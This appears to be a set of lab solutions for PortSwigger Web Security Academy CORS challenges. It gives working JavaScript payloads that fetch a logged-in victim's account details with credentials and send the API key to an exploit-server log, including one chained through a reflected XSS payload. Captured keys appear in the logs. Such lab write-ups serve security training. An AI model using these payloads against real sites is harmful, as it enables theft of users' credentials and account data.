# CORS

## CORS vulnerability with basic origin reflection
```html
<script>
    fetch('https://acc51f361e18076480b18f7400cb00e1.web-security-academy.net/accountDetails', {
        credentials: 'include',
    })
        .then(response => response.json())
        .then(data => {
            location = '/log?key=' + data.apikey;
        });

</script>
```
Then read the API key from log:
```
192.168.1.12    2019-11-26 17:43:29 +0000 "GET /log?key=C6jmr5ha0rCuLJLJwF2Advyo5Ww6jjEi HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/888822"
```


## CORS vulnerability with trusted null origin
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,
<script>
    fetch("https://ac261fc01eaf53ac8000046f00a70074.web-security-academy.net/accountDetails", {
        credentials: "include",
    })
        .then(response => response.json())
        .then(data => {
            location = "https://ac351fc01ef95355807a045a01ec00f8.web-security-academy.net/log?key=" + data.apikey;
        });
</script>'></iframe>
```
Then read the API key from log:
```
192.168.1.12    2019-11-26 21:43:49 +0000 "GET //log?key=FLgt9zxG64IV2d0DKYDm3pI2kRGtyY6g HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/885332"
```

### CORS vulnerability with trusted insecure protocols
There is an XSS vulnerability in the subdomain:
```
http://stock.acf01f3b1eda3d94803f4c7100240098.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

```html
<script>
   document.location="http://stock.acf01f3b1eda3d94803f4c7100240098.web-security-academy.net/?productId=4%3Cscript%3Efetch%28%27https%3A%2F%2Facf01f3b1eda3d94803f4c7100240098.web-security-academy.net%2FaccountDetails%27%2C+%7B+credentials%3A+%27include%27%2C+%7D%29+.then%28response+%3D%3E+response.json%28%29%29+.then%28data+%3D%3E+%7B+location+%3D+%27https%3A%2F%2Fac691fd21e1d3d63801b4ca901e30063.web-security-academy.net%2Flog%3Fkey%3D%27+%2B+data.apikey%3B+%7D%29%3B%3C%2Fscript%3E%0D%0A&storeId=1"
</script>
```
Then read the API key from log:
```
192.168.1.12    2019-11-26 22:22:25 +0000 "GET /log?key=eAzFrQXushulGePxvr5qRUUlReJxxyQD HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/329148"
```